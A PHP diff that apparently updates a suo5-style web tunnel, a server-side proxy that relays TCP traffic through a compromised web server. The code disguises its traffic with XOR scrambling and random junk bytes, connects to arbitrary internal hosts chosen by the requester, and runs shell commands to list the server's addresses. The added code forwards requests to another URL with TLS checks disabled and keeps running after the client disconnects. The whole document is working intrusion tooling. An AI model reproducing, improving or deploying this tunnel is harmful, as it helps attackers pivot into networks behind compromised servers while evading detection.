@@ -2,35 +2,37 @@
 error_reporting(E_ERROR | E_PARSE);
 ini_set('display_errors', 0);
 ini_set('display_startup_errors', 0);
-ini_set('allow_url_fopen', true);
-ini_set('allow_url_include', true);
-@ini_set('max_execution_time', 0);
-@ini_set('memory_limit', '256M');
+ini_set("allow_url_fopen", true);
+ini_set("allow_url_include", true);
+@ini_set('always_populate_raw_post_data', -1); // PHP8: deprecated, silenced
+ini_set('max_execution_time', 0);
 
-// Disable output buffering
+// bypass session lock
+ini_set('session.use_only_cookies', false);
+ini_set('session.use_cookies', false);
+ini_set('session.use_trans_sid', false);
+ini_set('session.cache_limiter', null);
+// force use PHPSESSID as session key
+if (array_key_exists('PHPSESSID', $_COOKIE)) {
+    session_id($_COOKIE['PHPSESSID']);
+} else {
+    session_start();
+    setcookie('PHPSESSID', session_id());
+    session_write_close();
+}
+
+// disable output buffering
 @ini_set('zlib.output_compression', 0);
-@ini_set('output_buffering', 'off');
-@ini_set('implicit_flush', 1);
 ob_implicit_flush(true);
 while (ob_get_level()) {
     ob_end_clean();
 }
 
-if (version_compare(PHP_VERSION, '5.4.0', '>=')) {
-    @http_response_code(200);
-}
-
-// Session configuration - use standard cookie-based sessions
-@ini_set('session.use_cookies', true);
-@ini_set('session.use_only_cookies', true);
-@ini_set('session.use_trans_sid', false);
-@ini_set('session.cache_limiter', '');
-@ini_set('session.cookie_httponly', true);
-@ini_set('session.save_path', sys_get_temp_dir());
-
 // Constants
 define('BUF_SIZE', 1024 * 16);
 define('MAX_READ_SIZE', 512 * 1024); // 512KB
+define('FILE_PREFIX', 'suo5_');
+define('TEMP_DIR', sys_get_temp_dir());
 
 // ============================================================================
 // Base64 URL-safe encoding/decoding
@@ -38,15 +40,15 @@ define('MAX_READ_SIZE', 512 * 1024); // 512KB
 
 function base64UrlEncode($data) {
     $encoded = base64_encode($data);
-    $encoded = str_replace('+', '-', $encoded);
-    $encoded = str_replace('/', '_', $encoded);
+    // Use strtr for better performance (single pass instead of multiple str_replace)
+    $encoded = strtr($encoded, '+/', '-_');
     $encoded = rtrim($encoded, '=');
     return $encoded;
 }
 
 function base64UrlDecode($data) {
-    $data = str_replace('-', '+', $data);
-    $data = str_replace('_', '/', $data);
+    // Use strtr for better performance (single pass instead of multiple str_replace)
+    $data = strtr($data, '-_', '+/');
     $padding = strlen($data) % 4;
     if ($padding) {
         $data .= str_repeat('=', 4 - $padding);
@@ -59,41 +61,47 @@ function base64UrlDecode($data) {
 // ============================================================================
 
 function marshalBase64($m) {
-    // Add junk data (0~32 random bytes)
+    // Add junk data (0~32 random bytes) - optimized
     $junkSize = mt_rand(0, 32);
     if ($junkSize > 0) {
-        $junk = '';
-        for ($i = 0; $i < $junkSize; $i++) {
-            $junk .= chr(mt_rand(0, 255));
+        // Use openssl_random_pseudo_bytes if available (PHP 5.3+), fallback to optimized mt_rand
+        if (function_exists('openssl_random_pseudo_bytes')) {
+            $m['_'] = openssl_random_pseudo_bytes($junkSize);
+        } else {
+            // Optimized: collect in array then implode
+            $junkChars = array();
+            for ($i = 0; $i < $junkSize; $i++) {
+                $junkChars[] = chr(mt_rand(0, 255));
+            }
+            $m['_'] = implode('', $junkChars);
         }
-        $m['_'] = $junk;
     }
 
-    // Serialize map
-    $buf = '';
+    // Serialize map - optimized: use array to collect parts
+    $bufParts = array();
     foreach ($m as $key => $value) {
-        $buf .= chr(strlen($key)) . $key . pack('N', strlen($value)) . $value;
+        $bufParts[] = chr(strlen($key)) . $key . pack('N', strlen($value)) . $value;
     }
+    $buf = implode('', $bufParts);
 
-    // XOR encryption
+    // XOR encryption - optimized: collect in array then implode
     $xorKey = array(mt_rand(1, 255), mt_rand(1, 255));
-    $data = '';
-    for ($i = 0; $i < strlen($buf); $i++) {
-        $data .= chr(ord($buf[$i]) ^ $xorKey[$i % 2]);
+    $bufLen = strlen($buf);
+    $dataChars = array();
+    for ($i = 0; $i < $bufLen; $i++) {
+        $dataChars[] = chr(ord($buf[$i]) ^ $xorKey[$i % 2]);
     }
-    $data = base64UrlEncode($data);
+    $data = base64UrlEncode(implode('', $dataChars));
 
     // Build header
     $header = pack('C2N', $xorKey[0], $xorKey[1], strlen($data));
-    // XOR header length bytes
+    // XOR header length bytes - optimized: direct pack instead of array loop
     $headerBytes = unpack('C*', $header);
-    for ($i = 3; $i <= 6; $i++) {
-        $headerBytes[$i] = $headerBytes[$i] ^ $xorKey[($i - 1) % 2];
-    }
-    $header = '';
-    foreach ($headerBytes as $byte) {
-        $header .= chr($byte);
-    }
+    $headerBytes[3] = $headerBytes[3] ^ $xorKey[2 % 2];
+    $headerBytes[4] = $headerBytes[4] ^ $xorKey[3 % 2];
+    $headerBytes[5] = $headerBytes[5] ^ $xorKey[4 % 2];
+    $headerBytes[6] = $headerBytes[6] ^ $xorKey[5 % 2];
+    $header = pack('C*', $headerBytes[1], $headerBytes[2], $headerBytes[3], $headerBytes[4], $headerBytes[5], $headerBytes[6]);
     $header = base64UrlEncode($header);
 
     return $header . $data;
@@ -138,11 +146,13 @@ function unmarshalBase64($input) {
         return $m;
     }
 
-    // Decrypt data
-    $decrypted = '';
-    for ($i = 0; $i < strlen($data); $i++) {
-        $decrypted .= chr(ord($data[$i]) ^ $xorKey[$i % 2]);
+    // Decrypt data - optimized: collect in array then implode
+    $dataLen = strlen($data);
+    $decryptedChars = array();
+    for ($i = 0; $i < $dataLen; $i++) {
+        $decryptedChars[] = chr(ord($data[$i]) ^ $xorKey[$i % 2]);
     }
+    $decrypted = implode('', $decryptedChars);
 
     // Parse map
     $i = 0;
@@ -178,11 +188,49 @@ function unmarshalBase64($input) {
 function randomString($length) {
     $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
     $charactersLength = strlen($characters);
-    $result = '';
+    // Optimized: collect in array then implode
+    $resultChars = array();
     for ($i = 0; $i < $length; $i++) {
-        $result .= $characters[mt_rand(0, $charactersLength - 1)];
+        $resultChars[] = $characters[mt_rand(0, $charactersLength - 1)];
     }
-    return $result;
+    return implode('', $resultChars);
+}
+
+function getFilePath($key) {
+    // Sanitize key to prevent path traversal
+    $safeKey = preg_replace('/[^a-zA-Z0-9_-]/', '', $key);
+    if (strlen($safeKey) === 0 || strlen($safeKey) > 255) {
+        throw new Exception('invalid key');
+    }
+    return TEMP_DIR . DIRECTORY_SEPARATOR . FILE_PREFIX . $safeKey;
+}
+
+function createStreamContext() {
+    // Create stream context with socket options for PHP8 compatibility
+    // These options must be set at connection creation time
+    $opts = array(
+        'socket' => array(
+            'tcp_nodelay' => true,  // Equivalent to TCP_NODELAY
+            'so_rcvbuf' => 128 * 1024,  // 128KB receive buffer
+            'so_sndbuf' => 128 * 1024,  // 128KB send buffer
+        ),
+    );
+    return stream_context_create($opts);
+}
+
+function ensureSocketOptions($socket) {
+    // PHP8 compatibility: check for both resource and object types
+    if (!is_resource($socket) && !is_object($socket)) {
+        return false;
+    }
+
+    // Set socket options for better performance
+    // Note: TCP_NODELAY, SO_RCVBUF, SO_SNDBUF are already set via stream context
+    // during connection creation (see createStreamContext() and stream_socket_client())
+    @stream_set_blocking($socket, false);
+    @stream_set_timeout($socket, 0, 0);
+
+    return true;
 }
 
 function newData($tunId, $data) {
@@ -218,11 +266,17 @@ function newHeartbeat($tunId) {
 function newDirtyChunk($size) {
     $m = array('ac' => chr(0x11));
     if ($size > 0) {
-        $data = '';
-        for ($i = 0; $i < $size; $i++) {
-            $data .= chr(mt_rand(0, 255));
+        // Use openssl_random_pseudo_bytes if available (PHP 5.3+), fallback to optimized mt_rand
+        if (function_exists('openssl_random_pseudo_bytes')) {
+            $m['d'] = openssl_random_pseudo_bytes($size);
+        } else {
+            // Optimized: collect in array then implode
+            $dataChars = array();
+            for ($i = 0; $i < $size; $i++) {
+                $dataChars[] = chr(mt_rand(0, 255));
+            }
+            $m['d'] = implode('', $dataChars);
         }
-        $m['d'] = $data;
     }
     return $m;
 }
@@ -242,26 +296,20 @@ function writeAndFlush($data, $dirtySize = 0) {
 }
 
 function getKey($key) {
-    if (session_status() === PHP_SESSION_NONE) {
-        @session_start();
-    }
+    @session_start();
     $value = isset($_SESSION[$key]) ? $_SESSION[$key] : null;
     session_write_close();
     return $value;
 }
 
 function putKey($key, $value) {
-    if (session_status() === PHP_SESSION_NONE) {
-        @session_start();
-    }
+    @session_start();
     $_SESSION[$key] = $value;
     session_write_close();
 }
 
 function removeKey($key) {
-    if (session_status() === PHP_SESSION_NONE) {
-        @session_start();
-    }
+    @session_start();
     if (isset($_SESSION[$key])) {
         unset($_SESSION[$key]);
     }
@@ -291,10 +339,142 @@ function getDirtySize($sid) {
 }
 
 // ============================================================================
+// Network address collection and redirect support
+// ============================================================================
+
+function collectLocalAddrs() {
+    static $addrs = null;
+    if ($addrs !== null) {
+        return $addrs;
+    }
+
+    $addrs = array();
+
+    // Collect local IP addresses
+    if (function_exists('exec')) {
+        $output = array();
+        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
+            @exec('ipconfig', $output);
+            foreach ($output as $line) {
+                if (preg_match('/IPv[46] Address[^:]*:\s*([0-9a-f.:]+)/i', $line, $matches)) {
+                    $addrs[$matches[1]] = true;
+                }
+            }
+        } else {
+            @exec('hostname -I 2>/dev/null', $output);
+            if (!empty($output)) {
+                $ips = preg_split('/\s+/', trim($output[0]));
+                foreach ($ips as $ip) {
+                    if (!empty($ip)) {
+                        $addrs[$ip] = true;
+                    }
+                }
+            }
+        }
+    }
+
+    // Add common localhost addresses
+    $addrs['127.0.0.1'] = true;
+    $addrs['localhost'] = true;
+    $addrs['::1'] = true;
+
+    // Add server IP if available
+    if (isset($_SERVER['SERVER_ADDR'])) {
+        $addrs[$_SERVER['SERVER_ADDR']] = true;
+    }
+
+    return $addrs;
+}
+
+function processRedirect($dataMap, $bodyPrefix, $bodyContent) {
+    if (!isset($dataMap['r']) || empty($dataMap['r'])) {
+        return false;
+    }
+
+    $redirectUrl = $dataMap['r'];
+
+    // Remove redirect key from dataMap
+    unset($dataMap['r']);
+
+    try {
+        // Rebuild request body
+        $newBody = $bodyPrefix . marshalBase64($dataMap) . $bodyContent;
+
+        // Initialize cURL
+        $ch = curl_init($redirectUrl);
+        if (!$ch) {
+            return false;
+        }
+
+        // Set options
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $_SERVER['REQUEST_METHOD']);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $newBody);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
+        curl_setopt($ch, CURLOPT_HEADER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 300);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+        // Copy headers
+        $headers = array();
+        foreach ($_SERVER as $key => $value) {
+            if (strpos($key, 'HTTP_') === 0) {
+                $header = str_replace('_', '-', substr($key, 5));
+                if (!in_array($header, array('HOST', 'CONTENT-LENGTH', 'CONTENT-TYPE', 'TRANSFER-ENCODING'))) {
+                    $headers[] = $header . ': ' . $value;
+                }
+            }
+        }
+
+        // Add required headers
+        if (isset($_SERVER['CONTENT_TYPE'])) {
+            $headers[] = 'Content-Type: ' . $_SERVER['CONTENT_TYPE'];
+        }
+        $headers[] = 'Content-Length: ' . strlen($newBody);
+        $headers[] = 'Connection: close';
+
+        // Parse redirect URL to get host
+        $urlParts = parse_url($redirectUrl);
+        if (isset($urlParts['host'])) {
+            $headers[] = 'Host: ' . $urlParts['host'];
+        }
+
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+        // Write response directly to output
+        curl_setopt($ch, CURLOPT_WRITEFUNCTION, function($curl, $data) {
+            echo $data;
+            flush();
+            if (function_exists('ob_flush')) {
+                @ob_flush();
+            }
+            return strlen($data);
+        });
+
+        // Execute
+        $result = curl_exec($ch);
+        curl_close($ch);
+
+        return $result !== false;
+
+    } catch (Exception $e) {
+        error_log("[Redirect] Failed: " . $e->getMessage());
+        return false;
+    }
+}
+
+// ============================================================================
 // Mode: Handshake (0x00)
 // ============================================================================
 
 function processHandshake($dataMap, $tunId) {
+    // Check for redirect first
+    if (isset($dataMap['r']) && !empty($dataMap['r'])) {
+        // Let main process handle redirect
+        return;
+    }
+
     $sid = randomString(16);
 
     // Parse template
@@ -392,16 +572,25 @@ function performHalfCreate($dataMap, $tunId, $dirtySize) {
         $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
     }
 
-    // Try to connect
-    $socket = @fsockopen($host, $port, $errno, $errstr, 5);
+    // Try to connect with stream context for socket options (PHP8 compatible)
+    $context = createStreamContext();
+    $socket = @stream_socket_client(
+        "tcp://{$host}:{$port}",
+        $errno,
+        $errstr,
+        5,
+        STREAM_CLIENT_CONNECT,
+        $context
+    );
 
     if (!$socket) {
+        error_log("[Half-{$tunId}] Connection failed to {$host}:{$port}: errno={$errno}, err={$errstr}");
         writeAndFlush(marshalBase64(newStatus($tunId, 0x01)), $dirtySize);
         return;
     }
 
-    stream_set_blocking($socket, false);
-    stream_set_timeout($socket, 0);
+    // Configure socket options for better performance
+    ensureSocketOptions($socket);
 
     // Initialize session
     putKey($tunId . '_ok', true);
@@ -412,52 +601,100 @@ function performHalfCreate($dataMap, $tunId, $dirtySize) {
 
     // Enter read loop
     $lastActivityTime = time();
+    $loopCount = 0;
+    $consecutiveEmptyReads = 0;
+
     while (true) {
+        $loopCount++;
+
         // Check if connection is still active
         $okStatus = getKey($tunId . '_ok');
         if ($okStatus === false || $okStatus === null) {
+            error_log("[Half-{$tunId}] Connection closed by client");
             break;
         }
 
-        // Read from socket
+        // Check if client disconnected
+        if (connection_aborted()) {
+            error_log("[Half-{$tunId}] Client connection aborted");
+            break;
+        }
+
+        // Read from socket with better timeout (100ms for better CPU efficiency)
         $read = array($socket);
         $write = null;
-        $except = null;
-        $result = @stream_select($read, $write, $except, 0, 50000); // 50ms timeout
+        $except = array($socket);
+        $result = @stream_select($read, $write, $except, 0, 100000); // 100ms timeout
 
         if ($result === false) {
+            error_log("[Half-{$tunId}] stream_select failed");
+            break;
+        }
+
+        // Check for socket exceptions
+        if (!empty($except)) {
+            error_log("[Half-{$tunId}] Socket exception detected");
             break;
         }
 
         if ($result > 0 && in_array($socket, $read)) {
             $data = @fread($socket, BUF_SIZE);
-            if ($data === false || feof($socket)) {
+            $eofStatus = feof($socket);
+
+            if ($data === false || $eofStatus) {
+                error_log("[Half-{$tunId}] Socket closed (feof={$eofStatus})");
                 break;
             }
             if (strlen($data) > 0) {
                 writeAndFlush(marshalBase64(newData($tunId, $data)), $dirtySize);
                 $lastActivityTime = time();
+                $consecutiveEmptyReads = 0;
+            } else {
+                $consecutiveEmptyReads++;
+                // If we get too many empty reads, something might be wrong
+                if ($consecutiveEmptyReads > 100) {
+                    error_log("[Half-{$tunId}] Too many consecutive empty reads");
+                    break;
+                }
             }
         }
 
         // Write to socket
         $writeBuf = getKey($tunId . '_write_buf');
         if ($writeBuf && strlen($writeBuf) > 0) {
+            $expectedLen = strlen($writeBuf);
             putKey($tunId . '_write_buf', '');
             $written = @fwrite($socket, $writeBuf);
+
             if ($written === false) {
+                error_log("[Half-{$tunId}] Write failed");
                 break;
+            }
+            if ($written < $expectedLen) {
+                error_log("[Half-{$tunId}] PARTIAL WRITE! expected={$expectedLen}, actual={$written}");
+                // Put back unwritten data at the beginning
+                $unwritten = substr($writeBuf, $written);
+                $existingBuf = getKey($tunId . '_write_buf');
+                putKey($tunId . '_write_buf', $unwritten . $existingBuf);
             }
             $lastActivityTime = time();
         }
 
         // Timeout check (60 seconds)
-        if (time() - $lastActivityTime > 60) {
+        $currentTime = time();
+        if ($currentTime - $lastActivityTime > 60) {
+            error_log("[Half-{$tunId}] Timeout after 60s ({$loopCount} iterations)");
             break;
+        }
+
+        // Send periodic heartbeat to keep connection alive
+        if ($loopCount % 50 === 0 && $currentTime - $lastActivityTime > 5) {
+            writeAndFlush(marshalBase64(newHeartbeat($tunId)), $dirtySize);
         }
     }
 
     // Cleanup
+    error_log("[Half-{$tunId}] Exiting loop after {$loopCount} iterations");
     @fclose($socket);
     removeKey($tunId . '_ok');
     removeKey($tunId . '_write_buf');
@@ -513,18 +750,27 @@ function performClassicCreate($dataMap, $tunId) {
         $port = isset($_SERVER['SERVER_PORT']) ? intval($_SERVER['SERVER_PORT']) : 80;
     }
 
-    // Try to connect
-    $socket = @fsockopen($host, $port, $errno, $errstr, 3);
+    // Try to connect with stream context for socket options (PHP8 compatible)
+    $context = createStreamContext();
+    $socket = @stream_socket_client(
+        "tcp://{$host}:{$port}",
+        $errno,
+        $errstr,
+        3,
+        STREAM_CLIENT_CONNECT,
+        $context
+    );
 
     if (!$socket) {
+        error_log("[Classic-{$tunId}] Connection failed to {$host}:{$port}: errno={$errno}, err={$errstr}");
         return array(
             'data' => marshalBase64(newStatus($tunId, 0x01)),
             'socket' => null
         );
     }
 
-    stream_set_blocking($socket, false);
-    stream_set_timeout($socket, 0);
+    // Configure socket options for better performance
+    ensureSocketOptions($socket);
 
     // Initialize session
     putKey($tunId . '_ok', true);
@@ -543,61 +789,96 @@ function classicBackgroundWorker($socket, $tunId) {
     @set_time_limit(0);
 
     $lastActivityTime = time();
+    $loopCount = 0;
+    $consecutiveEmptyReads = 0;
 
     while (true) {
+        $loopCount++;
+
         // Check if connection is still active
         $okStatus = getKey($tunId . '_ok');
         if ($okStatus === false || $okStatus === null) {
+            error_log("[Classic-{$tunId}] Connection closed by client");
             break;
         }
 
-        // Read from socket
+        // Read from socket with better timeout (100ms for better CPU efficiency)
         $read = array($socket);
         $write = null;
-        $except = null;
-        $result = @stream_select($read, $write, $except, 0, 50000); // 50ms timeout
+        $except = array($socket);
+        $result = @stream_select($read, $write, $except, 0, 100000); // 100ms timeout
 
         if ($result === false) {
+            error_log("[Classic-{$tunId}] stream_select failed");
+            break;
+        }
+
+        // Check for socket exceptions
+        if (!empty($except)) {
+            error_log("[Classic-{$tunId}] Socket exception detected");
             break;
         }
 
         if ($result > 0 && in_array($socket, $read)) {
             $data = @fread($socket, BUF_SIZE);
-            if ($data === false || feof($socket)) {
+            $eofStatus = feof($socket);
+
+            if ($data === false || $eofStatus) {
+                error_log("[Classic-{$tunId}] Socket closed (feof={$eofStatus})");
                 break;
             }
             if (strlen($data) > 0) {
-                // Append to read buffer
-                if (session_status() === PHP_SESSION_NONE) {
-                    @session_start();
+                // Append to read buffer using session
+                $key = $tunId . '_read_buf';
+                $existingBuf = getKey($key);
+                if ($existingBuf === null) {
+                    $existingBuf = '';
                 }
-                if (!isset($_SESSION[$tunId . '_read_buf'])) {
-                    $_SESSION[$tunId . '_read_buf'] = '';
-                }
-                $_SESSION[$tunId . '_read_buf'] .= $data;
-                session_write_close();
+                putKey($key, $existingBuf . $data);
+
                 $lastActivityTime = time();
+                $consecutiveEmptyReads = 0;
+            } else {
+                $consecutiveEmptyReads++;
+                // If we get too many empty reads, something might be wrong
+                if ($consecutiveEmptyReads > 100) {
+                    error_log("[Classic-{$tunId}] Too many consecutive empty reads");
+                    break;
+                }
             }
         }
 
         // Write to socket
         $writeBuf = getKey($tunId . '_write_buf');
         if ($writeBuf && strlen($writeBuf) > 0) {
+            $expectedLen = strlen($writeBuf);
             putKey($tunId . '_write_buf', '');
             $written = @fwrite($socket, $writeBuf);
+
             if ($written === false) {
+                error_log("[Classic-{$tunId}] Write failed");
                 break;
+            }
+            if ($written < $expectedLen) {
+                error_log("[Classic-{$tunId}] PARTIAL WRITE! expected={$expectedLen}, actual={$written}");
+                // Put back unwritten data at the beginning
+                $unwritten = substr($writeBuf, $written);
+                $existingBuf = getKey($tunId . '_write_buf');
+                putKey($tunId . '_write_buf', $unwritten . $existingBuf);
             }
             $lastActivityTime = time();
         }
 
         // Timeout check (300 seconds for classic mode)
-        if (time() - $lastActivityTime > 300) {
+        $currentTime = time();
+        if ($currentTime - $lastActivityTime > 60) {
+            error_log("[Classic-{$tunId}] Timeout after 60s ({$loopCount} iterations)");
             break;
         }
     }
 
     // Cleanup
+    error_log("[Classic-{$tunId}] Background worker exiting after {$loopCount} iterations");
     @fclose($socket);
     removeKey($tunId . '_ok');
     removeKey($tunId . '_read_buf');
@@ -611,31 +892,34 @@ function performWrite($dataMap, $tunId) {
         return;
     }
 
-    if (session_status() === PHP_SESSION_NONE) {
-        @session_start();
+    // Append to write buffer using session
+    $key = $tunId . '_write_buf';
+    $existingBuf = getKey($key);
+    if ($existingBuf === null) {
+        $existingBuf = '';
     }
-    if (!isset($_SESSION[$tunId . '_write_buf'])) {
-        $_SESSION[$tunId . '_write_buf'] = '';
-    }
-    $_SESSION[$tunId . '_write_buf'] .= $data;
-    session_write_close();
+    putKey($key, $existingBuf . $data);
 }
 
 function performRead($tunId) {
-    if (session_status() === PHP_SESSION_NONE) {
-        @session_start();
+    $key = $tunId . '_read_buf';
+    $readBuf = getKey($key);
+
+    if ($readBuf === null || $readBuf === '') {
+        return '';
     }
-    $readBuf = isset($_SESSION[$tunId . '_read_buf']) ? $_SESSION[$tunId . '_read_buf'] : '';
+
+    $dataToSend = '';
 
     // Limit to MAX_READ_SIZE and keep remaining data
     if (strlen($readBuf) > MAX_READ_SIZE) {
         $dataToSend = substr($readBuf, 0, MAX_READ_SIZE);
-        $_SESSION[$tunId . '_read_buf'] = substr($readBuf, MAX_READ_SIZE);
+        $remaining = substr($readBuf, MAX_READ_SIZE);
+        putKey($key, $remaining);
     } else {
         $dataToSend = $readBuf;
-        $_SESSION[$tunId . '_read_buf'] = '';
+        putKey($key, '');
     }
-    session_write_close();
 
     $response = '';
     if (strlen($dataToSend) > 0) {
@@ -804,6 +1088,7 @@ function process() {
                 }
 
                 // Finish request and start background worker if needed
+                ignore_user_abort(true);
                 if ($needWorker && $workerSocket) {
                     if (function_exists('fastcgi_finish_request')) {
                         fastcgi_finish_request();
